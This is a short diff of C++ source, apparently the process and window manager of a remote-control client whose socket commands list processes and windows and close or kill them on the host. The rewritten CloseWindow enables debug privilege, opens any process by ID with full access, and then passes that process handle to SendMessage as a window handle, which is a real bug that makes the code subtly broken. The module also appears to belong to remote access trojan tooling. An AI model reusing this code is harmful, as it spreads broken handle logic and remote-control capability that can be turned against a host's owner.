@@ -21,11 +21,10 @@
 CSystemManager::CSystemManager(CClientSocket *pClient, UINT nWhich) 
 	: CManager(pClient)
 {
-	// bWhich: COMMAND_SYSTEM(进程管理) FALSE(窗口管理)
+	// bWhich: COMMAND_PSLIST(进程管理) COMMAND_WSLIST(窗口管理)
 	if (nWhich == COMMAND_PSLIST) {
 		SendProcessList();
-	} 
-	else if (nWhich == COMMAND_WSLIST) {
+	} else if (nWhich == COMMAND_WSLIST) {
 		SendWindowsList();
 	}
 }
@@ -94,11 +93,21 @@ void CSystemManager::SendWindowsList()
 
 void CSystemManager::CloseWindow(LPBYTE buf)
 {
-	DWORD hWnd;
+	//DWORD hWnd;
 	// 得到窗口句柄
-	memcpy(&hWnd, buf, sizeof(DWORD));
+	//memcpy(&hWnd, buf, sizeof(DWORD));
 	// 向窗口发送关闭消息
-	::PostMessage((HWND__ *)hWnd, WM_CLOSE, 0, 0);
+	//::PostMessage((HWND)hWnd, WM_DESTROY, 0, 0);
+
+	DebugPrivilege(SE_DEBUG_NAME, TRUE);
+
+	HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(buf));
+	SendMessage((HWND)handle, WM_CLOSE, 0, 0);
+	//TerminateProcess(handle, 0);
+	CloseHandle(handle);
+
+	DebugPrivilege(SE_DEBUG_NAME, FALSE);
+	
 }
 
 void CSystemManager::TestWindow(LPBYTE buf)
@@ -166,7 +175,7 @@ void CSystemManager::KillProcess(LPBYTE lpBuffer, UINT nSize)
 	// 刷新进程列表
 	SendProcessList();
 	// 刷新窗口列表
-	SendWindowsList();	
+	//SendWindowsList();	
 }
 
 LPBYTE CSystemManager::getProcessList()
